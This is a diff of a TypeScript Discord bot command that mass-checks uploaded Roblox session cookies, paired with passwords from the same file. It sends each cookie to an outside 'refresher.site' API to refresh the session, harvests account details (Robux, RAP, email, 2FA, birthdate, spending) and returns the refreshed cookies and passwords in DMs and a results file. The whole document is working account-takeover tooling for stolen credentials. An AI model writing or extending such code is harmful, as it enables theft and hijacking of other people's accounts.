@@ -6,12 +6,9 @@ import {
   AttachmentBuilder,
 } from 'discord.js';
 import axios from 'axios';
-import * as Roblox from '../../lib/roblox-api';
 import {
   buildSuccessEmbed,
   buildErrorEmbed,
-  buildInvalidCookieEmbed,
-  buildIpLimitEmbed,
   buildProgressEmbed,
 } from '../../lib/embed-helpers';
 import { logger } from '../../lib/logger';
@@ -40,7 +37,7 @@ function extractCookies(text: string): string[] {
 
 const data = new SlashCommandBuilder()
   .setName('check')
-  .setDescription('Mass Checking File (Auto‑Reset)')
+  .setDescription('Mass Checking File (Auto‑Refresh via Refresher.site)')
   .addAttachmentOption((opt) =>
     opt.setName('file').setDescription('A .txt file containing cookies').setRequired(true),
   ) as SlashCommandBuilder;
@@ -73,14 +70,23 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       return;
     }
 
-    await interaction.editReply({ embeds: [buildProgressEmbed(`Scanning ${cookies.length} cookie(s)...`)] });
+    await interaction.editReply({ embeds: [buildProgressEmbed(`Checking ${cookies.length} cookie(s) via Refresher.site...`)] });
 
     let validCount = 0;
     let invalidCount = 0;
     let totalRobux = 0;
     let totalPending = 0;
+    let totalCredit = 0;
+    let totalRAP = 0;
+    let totalAnimations = 0;
+    let totalLastPlayedGames = 0;
+    let totalPurchaseCount = 0;
+    let totalRobuxSpent = 0;
+    let totalPremium = 0;
+
     const outputLines: string[] = [];
 
+    
     const passwordMap = new Map<string, string>();
     const lines = fileContent.split(/\r?\n/);
     let currentUser = '';
@@ -96,96 +102,139 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     let dataIndex = 0;
 
     for (const rawCookie of cookies) {
-      const validation = await Roblox.validateCookie(rawCookie);
-      if (!validation.valid) {
-        invalidCount++;
-        continue;
-      }
-
-      validCount++;
-      dataIndex++;
-      const userId = String(validation.userId!);
-      const username = validation.username!;
-
-      const resetResult = await Roblox.killAndRefreshSession(rawCookie);
-      let workingCookie = rawCookie;
-      if (resetResult.success && resetResult.newCookie) {
-        workingCookie = resetResult.newCookie;
-      }
-
-      const [
-        ageData, ageGroup,
-        robux, summary, country, email, parental, thumb,
-        credit, twoStep, phone, rap,
-        pendingRobux, ownedRares,
-      ] = await Promise.all([
-        Roblox.getUserAge(validation.userId!),
-        Roblox.fetchAgeGroup(workingCookie),
-        Roblox.fetchRobux(workingCookie, userId),
-        Roblox.fetchTransactionTotals(workingCookie, userId),
-        Roblox.fetchCountry(workingCookie),
-        Roblox.fetchEmailInfo(workingCookie),
-        Roblox.fetchParentalControls(workingCookie),
-        Roblox.fetchAvatarThumbnail(userId),
-        Roblox.fetchCreditBalance(workingCookie),
-        Roblox.fetchTwoStepConfig(workingCookie, userId),
-        Roblox.fetchPhoneInfo(workingCookie),
-        Roblox.fetchRolimonsRAP(userId),
-        Roblox.fetchPendingRobux(workingCookie, userId),
-        Roblox.getOwnedRareItems(workingCookie, userId),
-      ]);
-
-      totalRobux += robux;
-      totalPending += pendingRobux;
-
-      const password = passwordMap.get(username.toLowerCase()) || 'N/A';
-
-      const embed = buildSuccessEmbed(
-        `\`\`\`\n${workingCookie}\n\`\`\`\n**Username:** ${username}\n**Password:** ${password}`
-      );
-      if (thumb) embed.setThumbnail(thumb);
-
       try {
-        await interaction.user.send({ embeds: [embed] });
-      } catch {
-        await interaction.channel?.send({ embeds: [embed] });
-      }
+        const resp = await axios.post(
+          'https://refresher.site/api/refresh',
+          { cookie: rawCookie, getAccountInfo: true },
+          {
+            headers: {
+              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+              'Content-Type': 'application/json',
+              'Accept': 'application/json',
+              'Origin': 'https://refresher.site',
+              'Referer': 'https://refresher.site/',
+            },
+            timeout: 30000,
+            validateStatus: () => true,
+          }
+        );
 
-      outputLines.push(`Data ${dataIndex}`);
-      outputLines.push(`Username: ${username}`);
-      outputLines.push(`Password: ${password}`);
-      outputLines.push(`UserID: ${userId}`);
-      outputLines.push(`Cookie: ${workingCookie}`);
-      outputLines.push(`Robux: ${robux}`);
-      outputLines.push(`Pending: ${pendingRobux}`);
-      outputLines.push(`Country: ${country}`);
-      outputLines.push(`RAP: ${rap.rap ?? 'N/A'}`);
-      outputLines.push(`Premium: ${rap.premium ? 'Yes' : 'No'}`);
-      outputLines.push(`Email: ${email.verified || 'None'}`);
-      outputLines.push(`Phone: ${phone.hasPhone ? (phone.verified ? 'Verified' : 'Unverified') : 'No'}`);
-      outputLines.push(`2FA: ${[twoStep.email ? 'Email' : '', twoStep.authenticator ? 'Authenticator' : ''].filter(Boolean).join(', ') || 'None'}`);
-      outputLines.push(`Rare: ${ownedRares.join(', ') || 'None'}`);
-      outputLines.push('');
+        if (resp.status !== 200 || !resp.data?.success || !resp.data?.account_info) {
+          invalidCount++;
+          continue;
+        }
+
+        const account = resp.data.account_info;
+        const newCookie = resp.data.new_cookie || rawCookie;
+        validCount++;
+        dataIndex++;
+
+        const username = account.username || 'Unknown';
+        const userId = String(account.userId || '');
+        const password = passwordMap.get(username.toLowerCase()) || 'N/A';
+
+        const robux = account.robux ?? 0;
+        const pending = account.robux_pending ?? 0;
+        const credit = account.roblox_credit ?? 0;
+        const rap = account.total_rap ?? 0;
+        const premium = account.isPremium ? 'Yes' : 'No';
+        const email = account.email_status === 'Verified' ? account.email_address || 'Verified' : account.email_status || 'None';
+        const twoFactor = account.two_factor || 'None';
+        const birthdate = account.birthdate || 'Unknown';
+        const ageGroup = account.age_group || 'Unknown';
+        const animations = account.animations ?? 0;
+        const lastPlayedGames = account.last_played_games?.length ?? 0;
+        const continuePlaying = account.continue_playing || [];
+        const purchaseCount = continuePlaying.reduce((acc: number, g: any) => acc + (g.purchaseCount || 0), 0);
+        const robuxSpent = continuePlaying.reduce((acc: number, g: any) => acc + (g.robuxSpent || 0), 0);
+
+        totalRobux += robux;
+        totalPending += pending;
+        totalCredit += credit;
+        totalRAP += rap;
+        totalAnimations += animations;
+        totalLastPlayedGames += lastPlayedGames;
+        totalPurchaseCount += purchaseCount;
+        totalRobuxSpent += robuxSpent;
+        if (premium === 'Yes') totalPremium++;
+
+        const embed = buildSuccessEmbed(
+          `\`\`\`\n${newCookie}\n\`\`\`\n**Username:** ${username}\n**Password:** ${password}`
+        );
+        if (account.avatarUrl) embed.setThumbnail(account.avatarUrl);
+
+        try {
+          await interaction.user.send({ embeds: [embed] });
+        } catch {
+          const chan = interaction.channel as any;
+          if (chan && chan.send) await chan.send({ embeds: [embed] });
+        }
+
+        outputLines.push(`Data ${dataIndex}`);
+        outputLines.push(`Username: ${username}`);
+        outputLines.push(`Password: ${password}`);
+        outputLines.push(`UserID: ${userId}`);
+        outputLines.push(`Cookie: ${newCookie}`);
+        outputLines.push(`Robux: ${robux}`);
+        outputLines.push(`Pending Robux: ${pending}`);
+        outputLines.push(`Roblox Credit: ${credit}`);
+        outputLines.push(`Premium: ${premium}`);
+        outputLines.push(`Email: ${email}`);
+        outputLines.push(`Birthdate: ${birthdate}`);
+        outputLines.push(`Age Group: ${ageGroup}`);
+        outputLines.push(`Two Factor: ${twoFactor}`);
+        outputLines.push(`Total RAP: ${rap}`);
+        outputLines.push(`Animations: ${animations}`);
+        outputLines.push(`Last Played Games: ${lastPlayedGames}`);
+        outputLines.push(`Purchase Count: ${purchaseCount}`);
+        outputLines.push(`Total Robux Spent: ${robuxSpent}`);
+        outputLines.push('');
+      } catch (err: any) {
+        logger.error({ err, cookie: rawCookie.slice(0, 20) }, 'Refresher API error');
+        invalidCount++;
+      }
     }
 
     const totalCookies = cookies.length;
     const elapsedSeconds = ((Date.now() - startTime) / 1000).toFixed(1);
 
-    const summaryText =
-      `✧ **Results**\n────\n⭑ **Total:** ${totalCookies}\n⭑ **Valid:** ${validCount}\n⭑ **Invalid:** ${invalidCount}\n⭑ **Total Robux:** ${totalRobux.toLocaleString()}\n⭑ **Total Pending:** ${totalPending.toLocaleString()}\n⭑ **Time:** ${elapsedSeconds}s`;
+    const summaryLines = [
+      '==============',
+      'Total Summary:',
+      '==============',
+      `Total Valid: ${validCount}`,
+      `Total Invalid: ${invalidCount}`,
+      `Total Robux: ${totalRobux}`,
+      `Total Pending Robux: ${totalPending}`,
+      `Total Roblox Credit: ${totalCredit}`,
+      `Total RAP: ${totalRAP}`,
+      `Total Premium Accounts: ${totalPremium}`,
+      `Total Animations: ${totalAnimations}`,
+      `Total Last Played Games: ${totalLastPlayedGames}`,
+      `Total Purchases Count: ${totalPurchaseCount}`,
+      `Total Robux Spent: ${totalRobuxSpent}`,
+      `Time Taken: ${elapsedSeconds}s`,
+      '==============',
+      ''
+    ];
 
-    const summaryEmbed = buildSuccessEmbed(summaryText);
-    const fileContentOutput = outputLines.join('\n').trim() || 'No valid cookies found.';
+    const fileContentOutput = [...summaryLines, ...outputLines].join('\n').trim() || 'No valid cookies found.';
     const fileBuffer = Buffer.from(fileContentOutput, 'utf-8');
     const fileAttachment = new AttachmentBuilder(fileBuffer, { name: 'razor_result.txt' });
 
-    await interaction.user.send({
-      embeds: [summaryEmbed],
-      files: [fileAttachment],
-    }).catch(() => interaction.channel?.send({
-      embeds: [summaryEmbed],
-      files: [fileAttachment],
-    }));
+    const summaryEmbed = buildSuccessEmbed(
+      `✧ **Results**\n────\n⭑ **Total:** ${totalCookies}\n⭑ **Valid:** ${validCount}\n⭑ **Invalid:** ${invalidCount}\n⭑ **Total Robux:** ${totalRobux.toLocaleString()}\n⭑ **Total Pending:** ${totalPending.toLocaleString()}\n⭑ **Total Premium:** ${totalPremium}\n⭑ **Time:** ${elapsedSeconds}s`
+    );
+
+    try {
+      await interaction.user.send({
+        embeds: [summaryEmbed],
+        files: [fileAttachment],
+      });
+    } catch {
+      const chan = interaction.channel as any;
+      if (chan && chan.send) await chan.send({ embeds: [summaryEmbed], files: [fileAttachment] });
+    }
 
     await interaction.editReply({ content: '✅ Results sent to your DMs.', embeds: [] });
   } catch (err: any) {
@@ -196,7 +245,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
   }
 }
 
-async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
+async function handleButton(_interaction: MessageComponentInteraction): Promise<void> {
 }
 
 export const checkCommand: Command = { data, execute, handleButton };
